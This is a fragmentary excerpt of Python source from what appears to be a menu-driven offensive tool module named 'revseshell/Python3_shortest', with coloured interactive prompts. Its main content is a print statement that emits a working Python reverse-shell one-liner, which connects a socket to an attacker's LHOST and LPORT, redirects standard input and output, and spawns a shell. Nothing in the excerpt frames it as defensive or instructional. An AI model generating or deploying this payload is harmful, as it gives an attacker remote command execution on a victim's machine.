...
while True:  
    try:
        exin = input("\033[1;32msmf\033[1;34m(\033[1;31mrevseshell/Python3_shortest\033[1;34m) > \033[1;32m")
...
while True:
                    exin2 = input("\033[1;31m(\033[1;34mrevseshell/Python3_shortest\033[1;31m)> \033[1;32m")
...
time.sleep(1)
print(f"""
\033[1;32mpython3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{LHOST}",{LPORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
""")
